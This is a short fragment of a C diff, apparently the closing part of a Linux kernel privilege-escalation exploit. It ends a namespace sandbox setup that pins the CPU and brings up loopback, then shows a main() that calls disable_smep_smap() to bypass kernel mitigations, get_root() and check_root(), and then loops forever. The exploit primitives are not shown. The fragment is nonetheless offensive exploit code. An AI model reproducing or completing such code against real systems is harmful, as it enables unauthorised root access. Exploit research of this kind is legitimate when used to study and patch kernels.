+	if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
+		perror("sched_setaffinity()");
+		exit(EXIT_FAILURE);
+	}
+
+	if (system("/sbin/ifconfig lo up") != 0) {
+		perror("system(/sbin/ifconfig lo up)");
+		exit(EXIT_FAILURE);
+	}
+
+	printf("[.] namespace sandbox setup successfully\n");
+}
+
+int main() {
+	setup_sandbox();
+
+#if SMEP_SMAP_BYPASS
+	disable_smep_smap();
+#endif
+
+	get_root();
+
+	check_root();
+
+	while (true) {
+		sleep(100);
+	}
+
+	return 0;
 }
